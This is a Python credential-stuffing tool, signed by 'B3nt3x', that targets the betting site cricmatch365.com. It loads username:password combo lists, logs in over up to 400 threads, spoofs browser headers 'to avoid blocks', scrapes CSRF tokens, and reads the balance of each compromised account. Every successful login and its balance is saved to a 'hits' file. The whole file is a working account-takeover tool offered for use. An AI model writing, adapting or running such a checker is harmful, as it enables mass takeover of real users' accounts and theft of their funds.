import requests
import re
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
import os
import random
import string

init(autoreset=True)

class CricMatchChecker:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://cricmatch365.com"
        self.csrf_token = None

    def get_csrf_token(self):
        try:
            # Add more realistic headers to avoid blocks
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0'
            }
            # Get the main page first to get CSRF token
            res = self.session.get(self.base_url, headers=headers, timeout=10)
            if res.status_code != 200:
                print(f"{Fore.RED}[!] Failed to get main page - Status: {res.status_code}")
                return False
            
            # Look for CSRF token in meta tag
            csrf_match = re.search(r'<meta name="csrf-token" content="([^"]+)"', res.text)
            if csrf_match:
                self.csrf_token = csrf_match.group(1)
                return True
            else:
                # Try alternative token patterns
                token_patterns = [
                    r'name="_token"\s+value="([^"]+)"',
                    r'"_token"\s*:\s*"([^"]+)"',
                    r'csrf_token["\']?\s*:\s*["\']([^"\']+)["\']'
                ]
                for pattern in token_patterns:
                    match = re.search(pattern, res.text)
                    if match:
                        self.csrf_token = match.group(1)
                        return True
                
                print(f"{Fore.RED}[!] CSRF token not found in response")
                return False
        except Exception as e:
            print(f"{Fore.RED}[!] Error getting CSRF token: {str(e)}")
            return False

    def login(self, username, password):
        if not self.get_csrf_token():
            return False

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Referer': self.base_url,
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Origin': self.base_url,
            'DNT': '1',
            'Connection': 'keep-alive'
        }

        data = {
            '_token': self.csrf_token,
            'username': username,
            'password': password,
            'remember_me': '1',
        }

        try:
            response = self.session.post(f"{self.base_url}/login", headers=headers, data=data, timeout=10)
            
            # Check if login was successful by looking for redirect or success indicators
            if response.status_code == 302 or response.status_code == 200:
                # Check response content for success indicators
                response_text = response.text.lower()
                
                # Check for success patterns
                success_patterns = [
                    '"status":true',
                    '"success":true', 
                    '"message":"redirecting',
                    'redirect',
                    '"authenticated":true'
                ]
                
                for pattern in success_patterns:
                    if pattern in response_text:
                        return True
                
                # Check for failure patterns
                failure_patterns = [
                    '"status":false',
                    '"success":false',
                    'invalid',
                    'incorrect',
                    'error',
                    'failed'
                ]
                
                for pattern in failure_patterns:
                    if pattern in response_text:
                        return False
                
                # If no clear success/failure indicators, check if we got redirected or have session cookies
                if response.status_code == 302 or len(self.session.cookies) > 1:
                    return True
                    
                return False
            else:
                print(f"{Fore.RED}[!] Login failed - Status: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}[!] Login error: {str(e)}")
            return False

    def get_balance(self):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.8',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': self.base_url,
                'Referer': f"{self.base_url}/",
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Brave";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'DNT': '1',
                'Connection': 'keep-alive'
            }

            if not self.csrf_token:
                self.get_csrf_token()

            data = {
                '_token': self.csrf_token,
            }

            response = self.session.post(f"{self.base_url}/api2/v2/getBalance", headers=headers, data=data, timeout=15)
            if response.status_code == 200:
                json_data = response.json()
                balance = json_data.get('balance')
                if isinstance(balance, dict):
                    main_balance = balance.get('main_balance')
                else:
                    main_balance = None

                if main_balance:
                    clean_balance = re.sub(r'[^\d.]', '', str(main_balance))
                    if re.match(r'^\d+(?:\.\d{1,2})?$', clean_balance):
                        float_balance = float(clean_balance)
                        if 0 <= float_balance <= 99999999:
                            return clean_balance

            return "0.00"

        except Exception as e:
            print(f"{Fore.YELLOW}[!] Balance API error: {str(e)}")
            return "0.00"


    def check_account(self, username, password):
        if self.login(username, password):
            time.sleep(0.3)
            balance = self.get_balance()
            return True, balance if balance else "0.00"
        return False, None


class MassChecker:
    def __init__(self):
        self.success = 0
        self.invalid = 0
        self.total = 0
        self.lock = threading.Lock()
        self.success_file = self.create_file()

    def create_file(self):
        name = f"success_{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}.txt"
        return name

    def log_success(self, user, pwd, balance):
        with open(self.success_file, "a", encoding="utf-8") as f:
            f.write(f"[{user}:{pwd}] | Balance: {balance} @b3nt3x\n")

    def update_stats(self, success):
        with self.lock:
            if success:
                self.success += 1
            else:
                self.invalid += 1
            self.display()

    def display(self):
        print(f"\r{Fore.CYAN}[+] SUCCESSFUL: {Fore.GREEN}{self.success} {Fore.CYAN}| INVALID: {Fore.RED}{self.invalid} {Fore.CYAN}| TOTAL: {Fore.YELLOW}{self.total}", end='', flush=True)

    def process_combo(self, combo):
        try:
            if ':' not in combo.strip():
                print(f"\n{Fore.RED}[x] INVALID FORMAT: {combo.strip()}")
                self.update_stats(False)
                return
                
            user, pwd = combo.strip().split(':', 1)
            if not user or not pwd:
                print(f"\n{Fore.RED}[x] EMPTY CREDENTIALS: {combo.strip()}")
                self.update_stats(False)
                return
                
            checker = CricMatchChecker()
            success, balance = checker.check_account(user, pwd)
            if success:
                print(f"\n{Fore.GREEN}[$] GOT HIT: {user}:{pwd} | Balance: {balance}")
                self.log_success(user, pwd, balance)
                self.update_stats(True)
            else:
                print(f"\n{Fore.RED}[x] INVALID: {user}:{pwd}")
                self.update_stats(False)
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error processing {combo.strip()}: {str(e)}")
            self.update_stats(False)

    def run(self, combos, threads):
        self.total = len(combos)
        print(f"{Fore.CYAN}[*] Starting with {threads} threads on {self.total} accounts.")
        print(f"{Fore.CYAN}[*] Results saved to: {self.success_file}\n")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(self.process_combo, combo) for combo in combos]
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    self.update_stats(False)

        print(f"\n\n{Fore.GREEN}[✓] Done checking.")
        print(f"{Fore.CYAN}[+] SUCCESSFUL: {Fore.GREEN}{self.success} | INVALID: {Fore.RED}{self.invalid} | TOTAL: {Fore.YELLOW}{self.total}")
        if self.success:
            print(f"{Fore.GREEN}[✓] Hits saved to: {self.success_file}")


def main():
    print(Fore.CYAN + r"""
    
                _    _ _   _   _         _____ _    _ _           ____  
               | |  (_| | | | | |       / ____| |  | | |         |___ \ 
            ___| | ___| |_| |_| | ___  | |    | |__| | | __ __   ____) |
           / __| |/ | | __| __| |/ _ \ | |    |  __  | |/ / \ \ / |__ < 
           \__ |   <| | |_| |_| |  __/ | |____| |  | |   <   \ V /___) |
           |___|_|\_|_|\__|\__|_|\___|  \_____|_|  |_|_|\_\   \_/|____/ 


                                  BY B3nt3x
                       Disclaimer: Not for sale, on demand only.

    """)
    print(f"{Fore.CYAN}[*] Testing connection to cricmatch365.com...")
    try:
        test_checker = CricMatchChecker()
        if test_checker.get_csrf_token():
            print(f"{Fore.GREEN}[✓] Connection successful!")
        else:
            print(f"{Fore.RED}[!] Connection failed - check your internet or the site might be down")
    except Exception as e:
        print(f"{Fore.RED}[!] Connection test failed: {str(e)}")

    while True:
        filename = input(f"{Fore.YELLOW}[?] Enter combo file name (e.g., users.txt): {Style.RESET_ALL}").strip()
        if os.path.isfile(filename):
            break
        print(f"{Fore.RED}[-] File not found. Try again.")

    with open(filename, 'r', encoding='utf-8') as f:
        combos = [line.strip() for line in f if ':' in line]

    if not combos:
        print(f"{Fore.RED}[-] No valid combos found.")
        return

    while True:
        try:
            threads = int(input(f"{Fore.YELLOW}[?] Enter number of threads (1–400): {Style.RESET_ALL}"))
            if 1 <= threads <= 400:
                break
            print(f"{Fore.RED}[-] Enter a number between 1 and 400.")
        except:
            print(f"{Fore.RED}[-] Invalid number.")

    checker = MassChecker()
    checker.run(combos, threads)


if __name__ == "__main__":
    main()
# MassChecker class and main function remain same as previous version with learning comments

# For brevity here, let me know if you want the entire commented MassChecker class again.

#by bentex2006
